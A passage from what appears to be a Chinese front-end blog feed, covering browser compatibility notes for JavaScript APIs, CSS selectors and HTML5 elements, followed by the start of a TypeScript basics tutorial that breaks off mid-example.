支持 WebSocket 对象，并且与其他浏览器一样遵循了 Standard - RFC 6455 Support 协议。对于低版本的浏览器，SocketIO Client 端提供了 IE9 的解决方案（实现原理是在 WebSocket、AJAX long-polling、AJAX multipart streaming、 Forever Iframe 几种方式之间进行切换）。</p><h2 id="DOM-相关"><a href="#DOM-相关" class="headerlink" title="DOM 相关"></a>DOM 相关</h2><h3 id="document-all"><a href="#document-all" class="headerlink" title="document.all"></a>document.all</h3><p>仅支持 IE 浏览器，该特性已经从 Web 标准中删除，请尽量不要使用该特性。</p><h3 id="HTMLElement-childNodes"><a href="#HTMLElement-childNodes" class="headerlink" title="HTMLElement.childNodes"></a>HTMLElement.childNodes</h3><p>IE8 以及以下版本浏览器获仅获取元素节点，更高版本的浏览器以及现代浏览器获取包含文本节点的所有子节点。</p><h2 id="事件相关"><a href="#事件相关" class="headerlink" title="事件相关"></a>事件相关</h2><h3 id="window-event"><a href="#window-event" class="headerlink" title="window.event"></a>window.event</h3><p>window.event 作为 IE10 以及以下版本的 IE 浏览器获得事件对象的方法，<strong>在 IE11 中已经被移出</strong>，该方法是一个非标准化的方法。</p><h3 id="addEventListener"><a href="#addEventListener" class="headerlink" title="addEventListener"></a>addEventListener</h3><p><img src="http://img.cdn.esunr.xyz/markdown/20200603201239.png" alt=""></p><p>IE9 以下版本的浏览器不支持 addEventListener 方法添加事件，需要使用 attachEvent 来添加。同时需要注意，使用 attachEvent 方法有个缺点，this 的值会变成 window 对象的引用而不是触发事件的元素。</p><h2 id="图像相关"><a href="#图像相关" class="headerlink" title="图像相关"></a>图像相关</h2><h3 id="window-requestAnimationFrame"><a href="#window-requestAnimationFrame" class="headerlink" title="window.requestAnimationFrame"></a>window.requestAnimationFrame</h3><p><img src="http://img.cdn.esunr.xyz/markdown/20200608194036.png" alt=""></p><p>在 IE9 以及以下版本的浏览器上可以使用定时器来解决 <code>requestAnimationFrame</code> 的兼容性问题，但这也就意味着会失去其带来的最佳的动画流畅度的优势。</p><h3 id="Web-Animations-API"><a href="#Web-Animations-API" class="headerlink" title="Web Animations API"></a>Web Animations API</h3><p><img src="http://img.cdn.esunr.xyz/markdown/20200608194845.png" alt=""></p><p>Web Animations API 提供给了开发人员使用 JS 来操作动画的能力，但是目前该 API 的标准仍处于草案阶段，对浏览器的版本依赖较高（其中 Chrome 不完全支持，PC Safari 在 2020 年 5 月份的更新中完成了对 API 的全支持，IE 则完全不支持），因此目前阶段不推荐在生产环境下使用。</p><h3 id="WebGL"><a href="#WebGL" class="headerlink" title="WebGL"></a>WebGL</h3><p>WebGL1 兼容性：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200610152028.png" alt=""></p><p>WebGL2 兼容性：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200610152132.png" alt=""></p><p>WebGL 经常用于 3D Canvas，尽管 WebGL1 可以在 IE11 运行，但是需要注意的是前端最常用的 3D 模型渲染库 three.js 从 R95 版本起使用 WebGL2 环境来进行渲染，因此在 IE 浏览器上会出现兼容性问题。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="window-getComputedStyle"><a href="#window-getComputedStyle" class="headerlink" title="window.getComputedStyle()"></a>window.getComputedStyle()</h3><p><img src="http://img.cdn.esunr.xyz/markdown/20200603200329.png" alt=""></p><p>IE9+ 支持 <code>getComputedStyle()</code> 获取行外样式，可以使用 <code>currentStyle()</code> 兼容低版本浏览器。</p><h3 id="Date-prototype-getYear"><a href="#Date-prototype-getYear" class="headerlink" title="Date.prototype.getYear()"></a>Date.prototype.getYear()</h3><p>getYear() 方法返回指定的本地日期的年份。因为 getYear 不返回千禧年[full years] (“year 2000 problem”)，所以这个方法不再被使用，现在替换为 getFullYear。仅在 IE8 以及以下的浏览器可以获取到正常的年份。</p><h3 id="通过索引获取字符串某个字符"><a href="#通过索引获取字符串某个字符" class="headerlink" title="通过索引获取字符串某个字符"></a>通过索引获取字符串某个字符</h3><p>IE7 以及以下浏览器不兼容类似 <code>str[1]</code> 的写法，可以使用 <code>charAt()</code> 方法来由索引获取字符。</p><h3 id="WebWorker-API"><a href="#WebWorker-API" class="headerlink" title="WebWorker API"></a>WebWorker API</h3><p><img src="http://img.cdn.esunr.xyz/markdown/20200610151842.png" alt=""></p><h2 id="ES6-语法"><a href="#ES6-语法" class="headerlink" title="ES6 语法"></a>ES6 语法</h2><p>在现代浏览器中，已经基本可以使用 ES6 标准的语法，同时在 Chrome 80、Firefox 67、Safari 11.1 版本以上支持了动态 import 引入模块。但是在生产环境中使用 ES6 语法并不进行转义仍是一种不合适的做法。</p><h3 id="Babel"><a href="#Babel" class="headerlink" title="Babel"></a>Babel</h3><p>Babel 作为前端工程化的代码转义器，是目前让 ES6 语法兼容低版本浏览器的主要解决方案。引入 Babel 到构建工具中后，Babel 可以支持 ES6 语法（如：Class 语法、箭头函数、解构等）转 ES5 语法，让低版本浏览器可以正常解析。</p><p>但是对于 ES6 新增对象，如 Promise、Map、Set 等，原生 Babel 不能对其进行转义。为了支持新对象，Babel 提供了 babel-runtime 与 babel-polyfill 两种解决方案：</p><ul><li>runtime 主要是在需要使用 ES6 对象时将其作为模块引入，这样不会造成全局变量的污染；</li><li>而所谓的 polyfill 即语法垫片，则是将可能使用到的 ES6 对象在全局环境下进行声明并使用 ES5 语法进行了功能实现，这样可能会造成全局变量的污染，并且编译后 polyfill 将会占据很大空间，因此不推荐在方法类库中使用。</li></ul><h3 id="babel-preset-env"><a href="#babel-preset-env" class="headerlink" title="@babel/preset-env"></a>@babel/preset-env</h3><p>在 Babel7 后，官方推荐使用 @babel/preset-env 作为预设方案，开发者可以通过配置所需的浏览器的最低版本，就会自动在项目中引入所需的 plugin，来兼容语法。</p><p>以 Webpack 为例，当我们采用了如下的配置后，@babel/preset-env 最终转义得到的代码会兼容 IE8 以上的浏览器：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">test</span>: <span class="regexp">/\.js$/</span>,</span><br><span class="line">  <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>,</span><br><span class="line">  <span class="attr">use</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">loader</span>: <span class="string">&quot;babel-loader&quot;</span>,</span><br><span class="line">      <span class="attr">options</span>: &#123;</span><br><span class="line">        <span class="attr">presets</span>: [</span><br><span class="line">          [</span><br><span class="line">            <span class="string">&quot;@babel/preset-env&quot;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">targets</span>: &#123;</span><br><span class="line">                <span class="attr">browsers</span>: [<span class="string">&quot;ie &gt;= 8&quot;</span>]</span><br><span class="line">              &#125;,</span><br><span class="line">              <span class="attr">useBuiltIns</span>: <span class="string">&quot;usage&quot;</span>,</span><br><span class="line">              <span class="attr">corejs</span>: <span class="string">&quot;3.6.5&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;eslint-loader&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 IE8 环境下，由于 ES3 不允许使用保留字作为对象的键值，因此会出现代码报错（<a href="https://juejin.im/post/5cabf7b0e51d456e8b07dd04#heading-2">引用参考</a>）。</p><h1 id="4-CSS-属性兼容性问题"><a href="#4-CSS-属性兼容性问题" class="headerlink" title="4. CSS 属性兼容性问题"></a>4. CSS 属性兼容性问题</h1><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors">引用参考</a></p></blockquote><h3 id="基本选择器"><a href="#基本选择器" class="headerlink" title="基本选择器"></a>基本选择器</h3><p>基本选择器包含了通用选择器(<code>*</code>)、类型选择器、类选择器、ID 选择器、属性选择器(<code>[attr=value]</code>)，他们在 IE7+ 的浏览器环境下都得到了比较好的适配。但是关于兼容性，仍需要注意以下两点：</p><ol><li>对于可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@namespace"><strong>命名空间</strong></a> 的选择器，只有 IE9+ 以上的浏览器才可以使用。</li><li>属性选择器不区分大小写的修饰符(i)不能在 IE 浏览器上使用，区分大小写的修饰符(s)只能在 Firefox66 上使用（<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors">引用参考</a>）。</li></ol><h3 id="组合器"><a href="#组合器" class="headerlink" title="组合器"></a>组合器</h3><p>组合器包含了后代组合器、直接子代组合器(<code>&gt;</code>)、一般兄弟组合器(<code>~</code>)、紧邻兄弟组合器(<code>+</code>)。组合器需要在 IE7+ 以上版本的浏览器使用，更低版本的浏览器则不支持。</p><h3 id="伪类"><a href="#伪类" class="headerlink" title="伪类"></a>伪类</h3><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Pseudo-classes">引用参考</a></p></blockquote><p>伪类选择器的兼容情况通常比较复杂，在 CSS3 规范实现不标准的 IE 浏览器上会出现不兼容的情况，以下是对兼容性的概览：</p><p>支持比较好的伪类选择器 (IE4+)：</p><ol><li>:active</li><li>:hover</li><li>:link</li><li>:visited</li></ol><p>部分支持的伪类选择器：</p><table><thead><tr><th>选择器</th><th>兼容版本</th><th>备注</th></tr></thead><tbody><tr><td>:checked</td><td>IE9+</td><td></td></tr><tr><td>:focus</td><td>IE8+</td><td></td></tr><tr><td>:default</td><td>非 IE 浏览器</td><td></td></tr><tr><td>:disabled</td><td>IE9+</td><td>IE 浏览器不支持 <code>&lt;fieldset&gt;</code> 标签上的 disabled 状态识别</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:indeterminate">:indeterminate</a></td><td>IE10+</td><td></td></tr><tr><td>:first</td><td>IE8+</td><td></td></tr><tr><td>:not</td><td>IE9+</td><td></td></tr><tr><td>:first-child / :last-child</td><td>IE9+</td><td>对于 IE8 及更早版本的浏览器中的 :first-child，必须声明 &lt;!DOCTYPE&gt;</td></tr><tr><td>:first-of-type / :last-of-type</td><td>IE9+</td><td>IE浏览器会将所有未知元素视为相同的元素类型</td></tr><tr><td>:last-child / :first-child</td><td>IE9+</td><td></td></tr><tr><td>:nth-child() / :nth-last-child()</td><td>IE9+</td><td>IE浏览器不支持匹配没有父元素的元素</td></tr><tr><td>:nth-of-type() / :nth-last-of-type()</td><td>IE9+</td><td>IE浏览器会将所有未知元素视为相同的元素类型</td></tr><tr><td>:only-child</td><td>IE9+</td><td>IE浏览器不支持匹配没有父元素的元</td></tr><tr><td>:only-of-type</td><td>IE9+</td><td>IE浏览器会将所有未知元素视为相同的元素类型</td></tr><tr><td>:optional</td><td>IE10+</td><td></td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:out-of-range">:out-of-range</a></td><td>非 IE 浏览器</td><td></td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:root">:root</a></td><td>IE9+</td><td></td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:valid">:valid</a></td><td>IE10+</td><td>IE浏览器无法适用于 <code>&lt;form&gt;</code> 元素</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:target">:target</a></td><td>IE9+</td><td></td></tr></tbody></table><h3 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h3><blockquote><p>CSS3 规范中规定伪元素要使用双冒号 <code>::</code> 来与伪类做区分，但 IE8 以及以下的浏览器不支持这一规范，只能使用 <code>:</code>。</p></blockquote><table><thead><tr><th>伪元素</th><th>兼容版本</th><th>备注</th></tr></thead><tbody><tr><td>::after</td><td>IE8+</td><td>IE浏览器不支持动画和过渡支持</td></tr><tr><td>::before</td><td>IE8+</td><td>IE浏览器不支持动画和过渡支持</td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/::first-letter">::first-letter</a></td><td>IE5.5+</td><td>不支持荷兰文</td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/::first-line">::first-line</a></td><td>IE5.5+</td><td></td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::selection">::selection</a></td><td>IE9+</td><td>::selection CSS伪元素选择器是CSS第3级选择器的草案，但是在被推荐使用前就被废弃。它现在在第4级伪元素选择器草案中。</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::slotted">::slotted()</a></td><td>非 IE 浏览器</td><td></td></tr></tbody></table><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><h3 id="媒体查询器"><a href="#媒体查询器" class="headerlink" title="媒体查询器"></a>媒体查询器</h3><p>媒体查询器的支持情况比较复杂，但是常用于做页面响应式的 <code>width</code> 查询（width media feature）仅在 IE9+ 的浏览器环境下运行，<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@media"><strong>引用参考</strong></a> 中可以查看到完整的媒体查询器的兼容情况。</p><h3 id="page"><a href="#page" class="headerlink" title="@page"></a>@page</h3><p>@page 规则用于在打印文档时修改某些CSS属性。你不能用@page规则来修改所有的CSS属性，而是只能修改margin,orphans,widow 和 page breaks of the document。对其他属性的修改是无效的。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200611144557.png" alt=""></p><h1 id="5-HTML-标签兼容性问题"><a href="#5-HTML-标签兼容性问题" class="headerlink" title="5. HTML 标签兼容性问题"></a>5. HTML 标签兼容性问题</h1><h2 id="HTML5-标签支持"><a href="#HTML5-标签支持" class="headerlink" title="HTML5 标签支持"></a>HTML5 标签支持</h2><blockquote><p>关于 HTML5 标签，大部分常用的语义化标签如 nav、article 等，都可以在 IE9+ 的浏览器上正常被解析，因此这些标签不再进行一一列举，下文主要罗列出 HTML5 新增的功能性组件的兼容性情况。</p></blockquote><h3 id="template"><a href="#template" class="headerlink" title="template"></a>template</h3><p>HTML内容模板 <code>&lt;template&gt;</code> 元素是一种用于保存客户端内容机制，该内容在加载页面时不会呈现，但随后可以(原文为 may be)在运行时使用JavaScript实例化。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200605170434.png" alt=""></p><h3 id="video"><a href="#video" class="headerlink" title="video"></a>video</h3><p>HTML <code>&lt;video&gt;</code> 元素 用于在HTML或者XHTML文档中嵌入媒体播放器，用于支持文档内的视频播放。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200605170903.png" alt=""></p><h3 id="embed"><a href="#embed" class="headerlink" title="embed"></a>embed</h3><p>HTML <code>&lt;embed&gt;</code> 元素将外部内容嵌入文档中的指定位置。此内容由外部应用程序或其他交互式内容源（如浏览器插件）提供。</p><blockquote><p>不同浏览器之间显示有差异。Blink 内核浏览器（Chrome，Opera）会显示 HTML 资源的内容，但 Firefox 会显示一条通知消息，指出内容需要一个插件（见 bug 730768）。建议使用 <code>&lt;object&gt;</code> 或 <code>&lt;iframe&gt;</code> 元素。</p></blockquote><p><img src="http://img.cdn.esunr.xyz/markdown/20200605171315.png" alt=""></p><h3 id="audio"><a href="#audio" class="headerlink" title="audio"></a>audio</h3><p>HTML <code>&lt;audio&gt;</code> 元素用于在文档中表示音频内容。 <code>&lt;audio&gt;</code> 元素可以包含多个音频资源， 这些音频资源可以使用 src 属性或者<code>&lt;source&gt;</code> 元素来进行描述； 浏览器将会选择最合适的一个来使用。对于不支持 <code>&lt;audio&gt;</code> 元素的浏览器，<code>&lt;audio&gt;</code> 元素也可以作为浏览器不识别的内容加入到文档中。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200605171813.png" alt=""></p><h3 id="track"><a href="#track" class="headerlink" title="track"></a>track</h3><p>为 <code>&lt;video&gt;</code> 或 <code>&lt;audio&gt;</code> 这类媒体元素指定文本轨道（字幕）。(<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/track">MDN</a>)</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200605172000.png" alt=""></p><h3 id="canvas"><a href="#canvas" class="headerlink" title="canvas"></a>canvas</h3><p><code>&lt;canvas&gt;</code> 元素可被用来通过JavaScript（Canvas API 或 WebGL API）绘制图形及图形动画。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200605172242.png" alt=""></p><h3 id="svg"><a href="#svg" class="headerlink" title="svg"></a>svg</h3><p>定义一个嵌入式矢量图。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200605172451.png" alt=""></p><h3 id="datalist"><a href="#datalist" class="headerlink" title="datalist"></a>datalist</h3><p>代表提供给其他控件的一组预定义选项。(<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/datalist">MDN</a>)</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200605173000.png" alt=""></p><h3 id="output"><a href="#output" class="headerlink" title="output"></a>output</h3><p>代表计算值。(<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/output">MDN</a>)</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200605173133.png" alt=""></p><h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><p>代表进度条。(<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/progress">MDN</a>)</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200605173300.png" alt=""></p><h3 id="Meter"><a href="#Meter" class="headerlink" title="Meter"></a>Meter</h3><p>HTML <code>&lt;meter&gt;</code> 元素用来显示已知范围的标量值或者分数值。(<a href="[https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/meter]">MDN</a>)</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200605173331.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript基础概念入门</title>
      <link href="/2020/05/39427290f3ae.html"/>
      <url>/2020/05/39427290f3ae.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-Array-和-Tuple"><a href="#1-Array-和-Tuple" class="headerlink" title="1. Array 和 Tuple"></a>1. Array 和 Tuple</h1><p>定义数组：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">arrOfNumbers</span>: <span class="built_in">number</span>[] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">arrOfNumbers.<span class="title function_">push</span>(<span class="string">&quot;1&quot;</span>) <span class="comment">// error</span></span><br></pre></td></tr></table></figure><p>Tuple（元组）类似于数组，但是不同于普通 js 数组，元组可以定义每个位置的数据类型。</p><p>创建元组：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">user</span>: [<span class="built_in">string</span>, <span class="built_in">number</span>] = [<span class="string">&#x27;viking&#x27;</span>, <span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">user</span>: [<span class="built_in">string</span>, <span class="built_in">number</span>] = [<span class="string">&#x27;viking&#x27;</span>] <span class="comment">// error</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">user</span>: [<span class="built_in">string</span>, <span class="built_in">number</span>] = [<span class="number">12</span>, <span class="string">&#x27;viking&#x27;</span>] <span class="comment">// error</span></span><br></pre></td></tr></table></figure><h1 id="2-Interface-接口"><a href="#2-Interface-接口" class="headerlink" title="2. Interface 接口"></a>2. Interface 接口</h1><ul><li>对对象的 shape 进行描述</li><li>对类进行抽象</li><li>Duck Typing</li></ul><p>接口的定义：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="keyword">readonly</span> <span class="attr">id</span>: <span class="built_in">number</span>; <span class="comment">// 定义只读属性</span></span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">sex</span>: <span class="built_in">string</span>;</span><br><span class="line">  age?: <span class="built_in">number</span>; <span class="comment">// 定义可选参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接口的使用：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">xiaoming</span>: <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;EsunR&quot;</span>,</span><br><span class="line">  <span class="attr">sex</span>: <span class="string">&quot;man&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line">xiaoming.<span class="property">age</span> = <span class="number">19</span>;</span><br><span class="line">xiaoming.<span class="property">id</span> = <span class="number">2</span> <span class="comment">// error</span></span><br></pre></td></tr></table></figure><p>接口不仅可以用来定义对象，还可以用来定义函数：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IAdd</span> &#123;</span><br><span class="line">  (<span class="attr">a</span>: <span class="built_in">number</span>, <span class="attr">b</span>: <span class="built_in">number</span>): <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">a</span>: <span class="title class_">IAdd</span> = add;</span><br></pre></td></tr></table></figure><h1 id="3-Function-函数"><a href="#3-Function-函数" class="headerlink" title="3. Function 函数"></a>3. Function 函数</h1><p>创建函数：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">x: <span class="built_in">number</span>, y: <span class="built_in">number</span>, z?: <span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> z === <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y + z;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">add</span>(<span class="number">2</span>, <span class="number">3</span>);    <span class="comment">// 5</span></span><br><span class="line"><span class="title function_">add</span>(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>); <span class="comment">// 9</span></span><br></pre></td></tr></table></figure><p>我们还可以对变量定义函数类型，如定义变量 <code>add2</code> 为一个传入值为 3 个 number 类型的变量，且返回为 number 类型的函数，那么 <code>add</code> 函数就可以赋值给这个变量：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">add2</span>: <span class="function">(<span class="params">x: <span class="built_in">number</span>, y: <span class="built_in">number</span>, z?: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span>;</span><br><span class="line">add2 = add; <span class="comment">// success</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">add2</span>: <span class="function">(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span>, c: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span>;</span><br><span class="line">add2 = add; <span class="comment">// success</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">add2</span>: <span class="function">(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span>;</span><br><span class="line">add2 = add; <span class="comment">// success</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">add2</span>: <span class="function">(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">number</span>;</span><br><span class="line">add2 = add; <span class="comment">// error</span></span><br></pre></td></tr></table></figure><h1 id="3-Class-类"><a href="#3-Class-类" class="headerlink" title="3. Class 类"></a>3. Class 类</h1><p>类的基本使用与 ES6 相似，在此不再复述，主要区别在于 TS 中支持了类的修饰符：</p><ul><li>public </li><li>private</li><li>protected </li></ul><p>public 属性可以让外部实例直接获取到，默认的属性都为 public；而 private 属性只有在类的内部的方法中可以调用，而外部不可调用，也不可继承：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: <span class="built_in">string</span>, age: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">walk</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;walk&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> huahua = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&quot;花花&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(huahua.<span class="property">name</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(huahua.<span class="property">age</span>); <span class="comment">// error: 属性“age”为私有属性，只能在类“People”中访问。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: <span class="built_in">string</span>, age: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(name, age);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age; <span class="comment">// error: 属性“age”为私有属性，只能在类“People”中访问。</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果要想让该属性也可被子类继承，那么可以使用 protected 来对变量进行修饰：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  class A`nimal &#123;</span><br><span class="line">    public name: string;</span><br><span class="line"><span class="deletion">-   private age: number;</span></span><br><span class="line"><span class="addition">+   protected age: number;</span></span><br><span class="line">    constructor(name: string, age: number) &#123;</span><br><span class="line">      ... ...</span><br><span class="line">    &#125;</span><br><span class="line">    ... ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  class Dog extends Animal &#123;</span><br><span class="line">    constructor(name: string, age: number) 